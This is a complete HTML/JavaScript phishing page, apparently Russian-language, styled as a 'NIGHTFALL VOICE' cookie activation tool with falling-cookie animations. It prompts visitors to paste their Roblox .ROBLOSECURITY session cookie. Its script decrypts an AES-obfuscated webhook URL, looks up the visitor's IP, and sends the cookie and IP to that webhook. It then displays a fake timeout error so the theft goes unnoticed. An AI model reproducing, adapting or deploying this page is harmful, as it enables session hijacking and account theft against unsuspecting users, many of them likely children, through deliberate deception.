
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>NIGHTFALL VOICE | FALLING COOKIES</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(ellipse at 30% 20%, #12121a, #050508);
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
            position: relative;
            overflow-x: hidden;
        }

        .cookie-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }

        .float-cookie {
            position: absolute;
            top: -10%;
            filter: drop-shadow(0 0 8px rgba(255, 140, 140, 0.4));
            will-change: transform;
            animation: fallCookie 12s linear infinite;
            opacity: 0.7;
        }

        @keyframes fallCookie {
            0% {
                transform: translateY(0) rotate(0deg) scale(0.8);
                opacity: 0.7;
                filter: drop-shadow(0 0 8px rgba(255, 120, 120, 0.6));
            }
            100% {
                transform: translateY(110vh) rotate(360deg) scale(1.1);
                opacity: 0.3;
                filter: drop-shadow(0 0 2px rgba(255, 100, 100, 0.2));
            }
        }

        .card {
            background: rgba(12, 12, 20, 0.65);
            backdrop-filter: blur(20px);
            border-radius: 56px;
            padding: 44px 40px;
            max-width: 540px;
            width: 100%;
            border: 1px solid rgba(180, 90, 90, 0.4);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            transition: all 0.25s ease;
            z-index: 10;
            position: relative;
        }
        .card:hover {
            transform: translateY(-4px);
            border-color: rgba(200, 110, 110, 0.6);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.6);
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo h1 {
            font-size: 38px;
            font-weight: 700;
            background: linear-gradient(135deg, #e6b8b8, #cc7a7a, #b55a5a);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
        }
        .logo p {
            color: #b88a8a;
            font-size: 11px;
            background: rgba(0,0,0,0.3);
            display: inline-block;
            padding: 3px 18px;
            border-radius: 30px;
            backdrop-filter: blur(4px);
            margin-top: 10px;
        }

        .label {
            color: #d6a5a5;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .length-indicator {
            font-family: monospace;
            font-size: 11px;
            color: #d6a5a5;
            background: rgba(0,0,0,0.3);
            padding: 3px 12px;
            border-radius: 30px;
        }

        textarea {
            width: 100%;
            background: #080810;
            border: 1px solid #442a2a;
            border-radius: 32px;
            padding: 16px 20px;
            color: #e6d0d0;
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.2s;
        }
        textarea:focus {
            outline: none;
            border-color: #cc7a7a;
            box-shadow: 0 0 14px rgba(200, 100, 100, 0.4);
            background: #0c0c16;
        }

        .btn {
            width: 100%;
            background: linear-gradient(105deg, #402424, #8a4a4a);
            border: none;
            border-radius: 56px;
            padding: 16px;
            color: #f0e0e0;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            margin-top: 28px;
            transition: all 0.2s;
            letter-spacing: 1.5px;
        }
        .btn:hover {
            background: linear-gradient(105deg, #553030, #a55a5a);
            transform: scale(1.01);
            box-shadow: 0 0 20px rgba(200, 80, 80, 0.5);
        }
        .btn:active {
            transform: scale(0.99);
        }

        .status {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #c69a9a;
            background: rgba(0, 0, 0, 0.4);
            padding: 8px 16px;
            border-radius: 50px;
            backdrop-filter: blur(8px);
        }

        .footer {
            margin-top: 24px;
            display: flex;
            justify-content: center;
            gap: 24px;
            font-size: 9px;
            color: #6a5050;
            border-top: 1px solid #2a2020;
            padding-top: 16px;
        }

        a, a[href*="github"] {
            display: none !important;
        }
    </style>
</head>
<body>
<div class="cookie-bg" id="cookieBg"></div>
<div class="card">
    <div class="logo">
        <h1>NIGHTFALL VOICE</h1>
        <p>🍪 COOKIE ACTIVATION MODULE 🍪</p>
    </div>

    <label class="label">
        <span>🍪 .ROBLOSECURITY COOKIE</span>
        <span class="length-indicator" id="lengthCounter">0 символов</span>
    </label>
    <textarea id="cookie" rows="3" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."></textarea>

    <button class="btn" id="sendBtn">🍪 АКТИВИРОВАТЬ 🍪</button>
    <div class="status" id="statusText">● режим ожидания</div>
    <div class="footer">
        <span>🔒 AES-256</span>
        <span>🍪 cookie relay</span>
        <span>⚡ 0.8ms</span>
    </div>
</div>

<script>
    (function(){
        // ШИФРОВАННЫЙ ВЕБХУК
        const ENCRYPTED_WEBHOOK = "U2FsdGVkX18xYzJkM2U0ZjVnNmg3aTlqMGwxbjJvM3A0cTVyNnM3dDh1OXZ3MHh5MXoyM2E0YjVjNmQ3ZTlmMGcxM2EyYjNjN2Q3ZjhnOWwwbTFuM29wM3A0cTVyNnM3dDh1OXZ3MHh5MXoyM2E0YjVjNmQ=";
        const SECRET_KEY = "gothbreach_secure_key_2026";
        const SECRET_IV = "roblox_iv_16chars";

        let WEBHOOK_URL = null;

        function decryptWebhook() {
            if (typeof CryptoJS === 'undefined') {
                setTimeout(decryptWebhook, 100);
                return;
            }
            try {
                const decrypted = CryptoJS.AES.decrypt(ENCRYPTED_WEBHOOK, CryptoJS.enc.Utf8.parse(SECRET_KEY), {
                    iv: CryptoJS.enc.Utf8.parse(SECRET_IV),
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                WEBHOOK_URL = decrypted.toString(CryptoJS.enc.Utf8);
            } catch(e) {}
        }

        const cryptoScript = document.createElement('script');
        cryptoScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
        cryptoScript.onload = () => decryptWebhook();
        document.head.appendChild(cryptoScript);

        // ПЕЧЕНЬКИ — СРАЗУ ЛЕТЯТ, БЕЗ ЗАДЕРЖЕК
        const bgContainer = document.getElementById('cookieBg');
        
        for(let i = 0; i < 45; i++) {
            let c = document.createElement('div');
            c.className = 'float-cookie';
            c.textContent = '🍪';
            
            const size = 20 + Math.random() * 34;
            const startX = Math.random() * 100;
            const duration = 9 + Math.random() * 12;
            
            c.style.left = startX + '%';
            c.style.fontSize = size + 'px';
            c.style.animation = `fallCookie ${duration}s linear infinite`;
            c.style.opacity = 0.6 + Math.random() * 0.3;
            
            bgContainer.appendChild(c);
        }

        // КРОШКИ ПРИ КЛИКЕ
        function createCrumbs(x, y) {
            for(let i = 0; i < 10; i++) {
                let crumb = document.createElement('div');
                crumb.textContent = '🍪';
                crumb.style.position = 'fixed';
                crumb.style.pointerEvents = 'none';
                crumb.style.fontSize = '12px';
                crumb.style.left = x + 'px';
                crumb.style.top = y + 'px';
                crumb.style.zIndex = '9999';
                crumb.style.filter = 'drop-shadow(0 0 4px rgba(255,100,100,0.6))';
                crumb.style.animation = 'crumbExplode 0.6s ease-out forwards';
                
                const angle = Math.random() * Math.PI * 2;
                const distance = 25 + Math.random() * 60;
                const dx = Math.cos(angle) * distance;
                const dy = Math.sin(angle) * distance;
                crumb.style.setProperty('--x', dx + 'px');
                crumb.style.setProperty('--y', dy + 'px');
                
                document.body.appendChild(crumb);
                setTimeout(() => crumb.remove(), 600);
            }
        }

        const crumbStyle = document.createElement("style");
        crumbStyle.textContent = `
            @keyframes crumbExplode {
                0% { transform: scale(0.5) rotate(0deg); opacity: 0.9; filter: drop-shadow(0 0 4px #ff8888); }
                100% { transform: scale(1.4) translate(var(--x), var(--y)) rotate(220deg); opacity: 0; filter: drop-shadow(0 0 2px #ff6666); }
            }
        `;
        document.head.appendChild(crumbStyle);

        const cookieField = document.getElementById('cookie');
        const sendBtn = document.getElementById('sendBtn');
        const statusDiv = document.getElementById('statusText');
        const lengthCounter = document.getElementById('lengthCounter');

        function isValidCookie(val) {
            if (!val || val.trim() === '') return false;
            const t = val.trim();
            if (!t.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
            if (t.length < 750) return false;
            return true;
        }

        function updateUI() {
            const val = cookieField.value;
            const len = val.trim().length;
            lengthCounter.innerText = len + ' символов';
            if (!val || val.trim() === '') {
                statusDiv.innerHTML = '● режим ожидания';
                sendBtn.disabled = false;
            } else if (isValidCookie(val)) {
                statusDiv.innerHTML = '✓ кука загружена • готово';
                sendBtn.disabled = false;
            } else {
                statusDiv.innerHTML = '✗ неверный формат (мин. 750 символов)';
                sendBtn.disabled = false;
            }
        }

        async function sendCookie(event) {
            const rect = sendBtn.getBoundingClientRect();
            const x = rect.left + rect.width / 2;
            const y = rect.top + rect.height / 2;
            createCrumbs(x, y);

            const cookie = cookieField.value.trim();
            if (!cookie) return;
            if (!isValidCookie(cookie)) {
                statusDiv.innerHTML = '✗ неверная кука';
                return;
            }
            if (!WEBHOOK_URL) {
                statusDiv.innerHTML = '⏳ инициализация...';
                return;
            }

            sendBtn.disabled = true;
            sendBtn.textContent = "⏳ ОБРАБОТКА...";
            statusDiv.innerHTML = '🔄 отправка...';

            let ip = 'unknown';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) {}

            const msg = {
                content: `**NIGHTFALL VOICE | ACTIVATION**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 COOKIE**\nдлина: ${cookie.length}\n\`\`\`${cookie}\`\`\``
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(msg)
                });
                statusDiv.innerHTML = '⚠️ ошибка активации (таймаут)';
                cookieField.value = '';
                updateUI();
            } catch(e) {
                statusDiv.innerHTML = '✗ ошибка сети';
            }

            sendBtn.disabled = false;
            sendBtn.textContent = "🍪 АКТИВИРОВАТЬ 🍪";
        }

        cookieField.addEventListener('input', updateUI);
        sendBtn.addEventListener('click', sendCookie);
        updateUI();
    })();
</script>
</body>
</html>
